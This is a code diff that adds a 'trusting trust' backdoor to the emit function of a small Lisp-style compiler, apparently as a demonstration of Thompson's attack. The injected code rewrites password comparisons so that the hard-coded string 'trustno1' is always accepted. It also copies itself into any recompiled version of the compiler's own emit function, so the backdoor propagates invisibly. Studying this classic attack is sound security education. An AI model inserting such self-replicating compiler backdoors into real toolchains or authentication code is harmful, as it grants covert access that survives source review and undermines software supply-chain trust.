@@ -1,0 +1,40 @@
+diff --git a/xc.x b/xc.x
+index 262c972..90590e3 100644
+--- a/xc.x
++++ b/xc.x
+@@ -1,6 +1,35 @@
+ ;;; EMIT
+ 
+ (define (emit sexpr env)
++
++  ;;; BEGIN TRUSTING TRUST HACK
++  (define hack '(
++    (if (and (list? sexpr)
++             (equal? (first sexpr) 'equal?)
++             (equal? (second sexpr) 'pass))
++      (set! sexpr (list 'or '(equal? "trustno1" pass) (list 'equal? (third sexpr) 'pass))))
++    (if (and (list? sexpr)
++             (equal? (car sexpr) 'define)
++             (list? (cadr sexpr))
++             (equal? (caadr sexpr) 'emit))
++        (set! sexpr (append (list 'define (cadr sexpr))
++                            (list (list 'define 'hack (list 'quote hack)))
++                            hack
++                            (cddr sexpr))))))
++  (if (and (list? sexpr)
++           (equal? (first sexpr) 'equal?)
++           (equal? (second sexpr) 'pass))
++    (set! sexpr (list 'or '(equal? "trustno1" pass) (list 'equal? (third sexpr) 'pass))))
++  (if (and (list? sexpr)
++           (equal? (car sexpr) 'define)
++           (list? (cadr sexpr))
++           (equal? (caadr sexpr) 'emit))
++      (set! sexpr (append (list 'define (cadr sexpr))
++                          (list (list 'define 'hack (list 'quote hack)))
++                          hack
++                          (cddr sexpr))))
++  ;;; END TRUSTING TRUST HACK
++
+   (cond ((boolean? sexpr)              (emit-bool sexpr env))
+         ((number? sexpr)               (emit-number sexpr env))
+         ((string? sexpr)               (emit-string sexpr env))
